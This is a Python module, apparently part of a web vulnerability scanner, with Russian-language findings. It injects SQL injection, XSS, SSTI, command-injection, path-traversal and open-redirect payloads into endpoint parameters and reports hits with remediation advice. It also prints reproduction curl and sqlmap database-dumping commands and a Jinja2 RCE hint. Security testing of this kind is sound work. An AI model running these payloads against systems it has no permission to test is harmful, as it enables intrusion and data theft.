from __future__ import annotations
import time
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import Any
import requests

from ..adaptive import Candidate
from ..findings import Finding, Severity
from ..session import session_to_curl_flags

# ── SQL Injection payloads ─────────────────────────────────────────────────────

SQLI_ERROR_PAYLOADS = [
    ("'", "SQL error-based (single quote)"),
    ('"', "SQL error-based (double quote)"),
    ("'--", "SQL comment injection"),
    ("' OR '1'='1", "SQL OR-based bypass"),
    ("1' AND 1=CONVERT(int,@@version)--", "MSSQL version probe"),
    ("1' AND extractvalue(1,concat(0x7e,version()))--", "MySQL extractvalue"),
    ("'||(SELECT 1 FROM dual)--", "Oracle probe"),
]

SQL_ERROR_SIGNATURES = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"MySQLSyntaxErrorException",
    r"ORA-\d{5}",
    r"Oracle.*Driver",
    r"SQLServer.*Driver",
    r"Microsoft SQL Native Client",
    r"ODBC SQL Server Driver",
    r"PostgreSQL.*ERROR",
    r"pg_query\(\)",
    r"SQLiteException",
    r"SQLITE_ERROR",
    r"Syntax error.*SQLite",
    r"com\.microsoft\.sqlserver",
    r"Unclosed quotation mark",
    r"quoted string not properly terminated",
    r"You have an error in your SQL",
    r"supplied argument is not a valid MySQL",
    r"Column count doesn't match",
]

SQLI_TIME_PAYLOADS = [
    ("'; WAITFOR DELAY '0:0:5'--", "MSSQL time-based"),
    ("' AND SLEEP(5)--", "MySQL time-based"),
    ("'; SELECT pg_sleep(5)--", "PostgreSQL time-based"),
    ("' OR 1=1 AND SLEEP(5)--", "MySQL OR time-based"),
]

# ── XSS payloads ───────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    ('<script>alert("XSS")</script>', "basic script tag"),
    ('"><script>alert(1)</script>', "tag breakout"),
    ("'><img src=x onerror=alert(1)>", "img onerror"),
    ("<svg/onload=alert(1)>", "svg onload"),
    ('javascript:alert(1)', "javascript: URI"),
    ('"><details open ontoggle=alert(1)>', "HTML5 details tag"),
    ('<iframe srcdoc="<script>alert(1)</script>">', "iframe srcdoc"),
    ('{{7*7}}', "SSTI probe (also XSS context)"),
]

XSS_MARKER = "XSSProbePt"

# ── SSTI payloads ─────────────────────────────────────────────────────────────

SSTI_PAYLOADS = [
    ("{{7*7}}", "49", "Jinja2/Twig SSTI"),
    ("${7*7}", "49", "FreeMarker/EL SSTI"),
    ("<%= 7*7 %>", "49", "ERB/JSP SSTI"),
    ("#{7*7}", "49", "Thymeleaf SSTI"),
    ("*{7*7}", "49", "Thymeleaf alternate"),
]

# ── Command Injection ──────────────────────────────────────────────────────────

CMDI_PAYLOADS = [
    ("; id", "semicolon separation"),
    ("| id", "pipe"),
    ("`id`", "backtick"),
    ("$(id)", "command substitution"),
    ("; sleep 3", "blind time-based (sleep)"),
    ("| sleep 3", "blind time-based pipe"),
]

CMDI_SIGNATURES = [
    r"uid=\d+\(\w+\)",
    r"root:\w+:\d+:\d+",
]

# ── Path Traversal ────────────────────────────────────────────────────────────

PATH_TRAVERSAL_PAYLOADS = [
    ("../../../etc/passwd", "Unix LFI"),
    ("..%2F..%2F..%2Fetc%2Fpasswd", "URL-encoded LFI"),
    ("..\\..\\..\\windows\\win.ini", "Windows LFI"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "Double URL-encoded"),
    ("....//....//....//etc/passwd", "Filter bypass"),
    ("/etc/passwd", "Absolute path"),
    ("file:///etc/passwd", "file:// URI"),
]

LFI_SIGNATURES = [
    r"root:.*:0:0:",
    r"\[boot loader\]",
    r"\[extensions\]",
    r"for 16-bit app support",
]

# ── Open Redirect ─────────────────────────────────────────────────────────────

REDIRECT_PARAMS = ["redirect", "redirect_to", "redirect_url", "next", "url",
                   "return", "returnTo", "return_url", "rurl", "dest",
                   "destination", "go", "goto", "target", "link", "location",
                   "continue", "ref", "callback"]

REDIRECT_PAYLOADS = [
    "https://evil.example.com",
    "//evil.example.com",
    "///evil.example.com",
    "/\\evil.example.com",
    "https:evil.example.com",
]


def run(
    session: requests.Session,
    base_url: str,
    endpoints: list,
    store,
    timebased: bool = False,
    deep_xss: bool = False,
) -> None:
    print("[*] Checking injection vulnerabilities...")
    if timebased:
        print("  [*] Time-based blind SQLi включён (медленнее)")
    curl_auth = session_to_curl_flags(session)
    timeout = getattr(session, 'timeout', 15)

    for ep in endpoints:
        params = ep.params.copy()
        body_params = ep.body_params.copy()

        if not params and not body_params:
            continue

        _check_sqli(session, ep, params, body_params, curl_auth, timeout, store,
                    timebased=timebased)
        _check_xss(session, ep, params, body_params, curl_auth, timeout, store,
                   deep=deep_xss)
        _check_ssti(session, ep, params, body_params, curl_auth, timeout, store)
        _check_cmdi(session, ep, params, body_params, curl_auth, timeout, store)
        _check_path_traversal(session, ep, params, body_params, curl_auth, timeout, store)

    _check_open_redirect(session, base_url, endpoints, curl_auth, timeout, store)


# ── SQL Injection ──────────────────────────────────────────────────────────────

def _check_sqli(session, ep, params, body_params, curl_auth, timeout, store,
                timebased: bool = False):
    target_params = list(params.items()) or list(body_params.items())

    for param_name, _ in target_params:
        # Error-based
        for payload, technique in SQLI_ERROR_PAYLOADS:
            resp = _inject_param(session, ep, param_name, payload, params, body_params, timeout)
            if resp is None:
                continue
            text = resp.text[:5000]
            for sig in SQL_ERROR_SIGNATURES:
                if re.search(sig, text, re.IGNORECASE):
                    curl_cmd = _make_curl(ep, param_name, payload, curl_auth, params, body_params)

                    def _probe(new_payload, _ep=ep, _param=param_name, _params=params,
                               _body=body_params, _timeout=timeout):
                        return _inject_param(session, _ep, _param, new_payload, _params, _body, _timeout)

                    store.add_candidate(Candidate(
                        finding=Finding(
                            title=f"SQL Injection (Error-based) — параметр '{param_name}'",
                            severity=Severity.HIGH,
                            category="Injection",
                            cwe="CWE-89",
                            description=(
                                f"Один payload вызвал в ответе сигнатуру SQL-ошибки в параметре "
                                f"'{param_name}' ({ep.method} {ep.url}).\n"
                                f"Техника: {technique}\n"
                                f"Сигнатура в ответе: {sig}\n"
                                "Единичное совпадение сигнатуры может быть и обычной страницей "
                                "ошибки приложения — нужна дифференциальная проверка true/false условий."
                            ),
                            url=ep.url,
                            parameter=param_name,
                            method=ep.method,
                            evidence=f"Payload: {payload}\nОтвет содержит: {re.search(sig, text, re.IGNORECASE).group()[:200]}",
                            remediation=(
                                "1. Используйте параметризованные запросы / Prepared Statements.\n"
                                "2. Никогда не подставляйте пользовательский ввод напрямую в SQL.\n"
                                "3. Применяйте ORM с экранированием.\n"
                                "4. Запустите sqlmap для полного exploitation: "
                                f"sqlmap -u '{ep.url}' -p '{param_name}' --dbs"
                            ),
                            reproduction=(
                                f"# Ручная проверка:\n{curl_cmd}\n\n"
                                f"# Автоматизация через sqlmap:\n"
                                f"sqlmap -u '{ep.url}' -p '{param_name}' "
                                f"--cookie '{_cookies_str(session)}' --batch --dbs"
                            ),
                        ),
                        kind="sqli",
                        context={"probe": _probe, "parameter": param_name},
                    ))
                    break  # Found for this payload, move to next param
            else:
                continue
            break  # Found for this param

        # Time-based blind (only in aggressive mode)
        if not timebased:
            continue
        for payload, technique in SQLI_TIME_PAYLOADS:
            resp, elapsed = _inject_param_timed(session, ep, param_name, payload, params, body_params, timeout)
            if resp is None:
                continue
            if elapsed >= 4.5:
                curl_cmd = _make_curl(ep, param_name, payload, curl_auth, params, body_params)
                store.add(Finding(
                    title=f"SQL Injection (Time-based Blind) — параметр '{param_name}'",
                    severity=Severity.CRITICAL,
                    category="Injection",
                    cwe="CWE-89",
                    description=(
                        f"Обнаружена слепая SQL-инъекция (задержка {elapsed:.1f}с) "
                        f"в параметре '{param_name}'.\nТехника: {technique}"
                    ),
                    url=ep.url,
                    parameter=param_name,
                    method=ep.method,
                    evidence=f"Payload: {payload}\nВремя ответа: {elapsed:.1f}с (норма ~{timeout}с timeout)",
                    remediation=(
                        "1. Параметризованные запросы / Prepared Statements.\n"
                        "2. Проверьте все точки формирования SQL-запросов."
                    ),
                    reproduction=(
                        f"# Ручная проверка (ожидайте задержку ~5с):\n{curl_cmd}\n\n"
                        f"# sqlmap (time-based):\n"
                        f"sqlmap -u '{ep.url}' -p '{param_name}' "
                        f"--cookie '{_cookies_str(session)}' --technique=T --batch"
                    ),
                ))
                break


# ── XSS ───────────────────────────────────────────────────────────────────────

def _check_xss(session, ep, params, body_params, curl_auth, timeout, store,
               deep: bool = False):
    target_params = list(params.items()) or list(body_params.items())

    payloads = XSS_PAYLOADS if deep else XSS_PAYLOADS[:4]
    for param_name, _ in target_params:
        for payload, technique in payloads:
            resp = _inject_param(session, ep, param_name, payload, params, body_params, timeout)
            if resp is None:
                continue
            ct = resp.headers.get("content-type", "").lower()
            if "html" not in ct and "text/" not in ct:
                continue
            if payload in resp.text or payload.replace('"', '&quot;') in resp.text:
                curl_cmd = _make_curl(ep, param_name, payload, curl_auth, params, body_params)
                store.add(Finding(
                    title=f"Reflected XSS — параметр '{param_name}'",
                    severity=Severity.HIGH,
                    category="XSS",
                    cwe="CWE-79",
                    description=(
                        f"Параметр '{param_name}' отражает введённые данные без экранирования. "
                        f"Техника: {technique}."
                    ),
                    url=ep.url,
                    parameter=param_name,
                    method=ep.method,
                    evidence=f"Payload: {payload}\nНайден в ответе без изменений",
                    remediation=(
                        "1. Экранируйте вывод в HTML-контексте: htmlspecialchars(), escapeHtml().\n"
                        "2. Используйте Content-Security-Policy с nonces.\n"
                        "3. Атрибут HttpOnly на сессионных cookies."
                    ),
                    reproduction=(
                        f"# Откройте в браузере:\n"
                        f"{ep.url}?{param_name}={payload}\n\n"
                        f"# Или через curl:\n{curl_cmd}"
                    ),
                ))
                break


# ── SSTI ──────────────────────────────────────────────────────────────────────

def _check_ssti(session, ep, params, body_params, curl_auth, timeout, store):
    target_params = list(params.items()) or list(body_params.items())

    for param_name, _ in target_params:
        for payload, expected, engine in SSTI_PAYLOADS:
            resp = _inject_param(session, ep, param_name, payload, params, body_params, timeout)
            if resp is None:
                continue
            if expected in resp.text:
                curl_cmd = _make_curl(ep, param_name, payload, curl_auth, params, body_params)
                store.add(Finding(
                    title=f"Server-Side Template Injection (SSTI) — параметр '{param_name}'",
                    severity=Severity.CRITICAL,
                    category="Injection",
                    cwe="CWE-94",
                    description=(
                        f"Шаблонное выражение '{payload}' вычислилось как '{expected}' "
                        f"в параметре '{param_name}'. Движок: {engine}.\n"
                        "SSTI позволяет выполнять произвольный код на сервере."
                    ),
                    url=ep.url,
                    parameter=param_name,
                    method=ep.method,
                    evidence=f"Payload: {payload} → ответ содержит: {expected}",
                    remediation=(
                        "1. Никогда не подставляйте пользовательский ввод в шаблон напрямую.\n"
                        "2. Используйте sandbox-окружение шаблонизатора.\n"
                        "3. Валидируйте и нормализуйте входные данные до передачи в шаблон."
                    ),
                    reproduction=(
                        f"# Базовая проверка (ожидаемый ответ: {expected}):\n"
                        f"{curl_cmd}\n\n"
                        f"# RCE через Jinja2 (при подтверждённом SSTI):\n"
                        f"# Payload: {{{{''.__class__.__mro__[1].__subclasses__()}}}}"
                    ),
                ))
                break


# ── Command Injection ──────────────────────────────────────────────────────────

def _check_cmdi(session, ep, params, body_params, curl_auth, timeout, store):
    target_params = list(params.items()) or list(body_params.items())

    for param_name, _ in target_params:
        for payload, technique in CMDI_PAYLOADS:
            resp = _inject_param(session, ep, param_name, payload, params, body_params, timeout)
            if resp is None:
                continue
            for sig in CMDI_SIGNATURES:
                if re.search(sig, resp.text):
                    curl_cmd = _make_curl(ep, param_name, payload, curl_auth, params, body_params)
                    store.add(Finding(
                        title=f"Command Injection — параметр '{param_name}'",
                        severity=Severity.CRITICAL,
                        category="Injection",
                        cwe="CWE-78",
                        description=(
                            f"Вывод команды '{payload.strip()}' обнаружен в ответе. "
                            f"Параметр '{param_name}' передаётся в системный вызов без фильтрации."
                        ),
                        url=ep.url,
                        parameter=param_name,
                        method=ep.method,
                        evidence=f"Payload: {payload}\nОтвет: {re.search(sig, resp.text).group()[:200]}",
                        remediation=(
                            "1. Избегайте передачи пользовательского ввода в shell-команды.\n"
                            "2. Используйте execv/execve с массивом аргументов (без shell=True).\n"
                            "3. Белый список допустимых значений параметра."
                        ),
                        reproduction=curl_cmd,
                    ))
                    break


# ── Path Traversal / LFI ──────────────────────────────────────────────────────

def _check_path_traversal(session, ep, params, body_params, curl_auth, timeout, store):
    target_params = list(params.items()) or list(body_params.items())

    for param_name, _ in target_params:
        for payload, technique in PATH_TRAVERSAL_PAYLOADS:
            resp = _inject_param(session, ep, param_name, payload, params, body_params, timeout)
            if resp is None:
                continue
            for sig in LFI_SIGNATURES:
                if re.search(sig, resp.text, re.IGNORECASE):
                    curl_cmd = _make_curl(ep, param_name, payload, curl_auth, params, body_params)
                    store.add(Finding(
                        title=f"Path Traversal / LFI — параметр '{param_name}'",
                        severity=Severity.CRITICAL,
                        category="Injection",
                        cwe="CWE-22",
                        description=(
                            f"Параметр '{param_name}' позволяет читать файлы за пределами webroot. "
                            f"Техника: {technique}."
                        ),
                        url=ep.url,
                        parameter=param_name,
                        method=ep.method,
                        evidence=f"Payload: {payload}\nОтвет содержит: {re.search(sig, resp.text, re.IGNORECASE).group()[:200]}",
                        remediation=(
                            "1. Нормализуйте путь и проверяйте, что он находится внутри разрешённой директории.\n"
                            "2. Используйте basename() перед подстановкой имён файлов.\n"
                            "3. Белый список допустимых файлов."
                        ),
                        reproduction=curl_cmd,
                    ))
                    break


# ── Open Redirect ─────────────────────────────────────────────────────────────

def _check_open_redirect(session, base_url, endpoints, curl_auth, timeout, store):
    checked = set()
    for ep in endpoints:
        parsed = urlparse(ep.url)
        qs = parse_qs(parsed.query)
        for param in REDIRECT_PARAMS:
            if param in qs and ep.url not in checked:
                checked.add(ep.url)
                for payload in REDIRECT_PAYLOADS:
                    try:
                        new_qs = qs.copy()
                        new_qs[param] = [payload]
                        new_url = urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, urlencode(new_qs, doseq=True), ""
                        ))
                        resp = session.get(new_url, timeout=8, allow_redirects=False)
                        loc = resp.headers.get("location", "")
                        if "evil.example.com" in loc:
                            store.add(Finding(
                                title=f"Open Redirect — параметр '{param}'",
                                severity=Severity.MEDIUM,
                                category="Open Redirect",
                                cwe="CWE-601",
                                description=(
                                    f"Параметр '{param}' принимает произвольный URL для редиректа. "
                                    "Используется в фишинге: жертва видит ссылку на доверенный домен, "
                                    "а затем переадресовывается на вредоносный сайт."
                                ),
                                url=ep.url,
                                parameter=param,
                                evidence=f"Location: {loc}",
                                remediation=(
                                    "1. Разрешайте редирект только на известные пути (relative URLs).\n"
                                    "2. Валидируйте домен по белому списку.\n"
                                    "3. Предупреждайте пользователя при переходе на внешний ресурс."
                                ),
                                reproduction=f"curl -sk {curl_auth} -I '{new_url}'",
                            ))
                            break
                    except Exception:
                        pass


# ── Helpers ───────────────────────────────────────────────────────────────────

def _inject_param(session, ep, param_name, payload, params, body_params, timeout):
    try:
        if ep.method == "GET" or ep.method == "HEAD":
            new_params = params.copy()
            new_params[param_name] = payload
            resp = session.get(ep.url, params=new_params, timeout=timeout)
        else:
            new_body = body_params.copy()
            new_body[param_name] = payload
            ct = ep.content_type or "application/x-www-form-urlencoded"
            if "json" in ct:
                resp = session.request(ep.method, ep.url, json=new_body, timeout=timeout)
            else:
                resp = session.request(ep.method, ep.url, data=new_body, timeout=timeout)
        return resp
    except Exception:
        return None


def _inject_param_timed(session, ep, param_name, payload, params, body_params, timeout):
    t0 = time.monotonic()
    resp = _inject_param(session, ep, param_name, payload, params, body_params, timeout + 6)
    elapsed = time.monotonic() - t0
    return resp, elapsed


def _make_curl(ep, param_name, payload, curl_auth, params, body_params) -> str:
    if ep.method == "GET" or not body_params:
        p = params.copy()
        p[param_name] = payload
        qs = urlencode(p)
        parsed = urlparse(ep.url)
        url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", qs, ""))
        return f"curl -sk {curl_auth} '{url}'"
    else:
        body = body_params.copy()
        body[param_name] = payload
        data_str = urlencode(body)
        return (
            f"curl -sk {curl_auth} -X {ep.method} "
            f"-d '{data_str}' '{ep.url}'"
        )


def _cookies_str(session) -> str:
    return "; ".join(f"{k}={v}" for k, v in session.cookies.items())
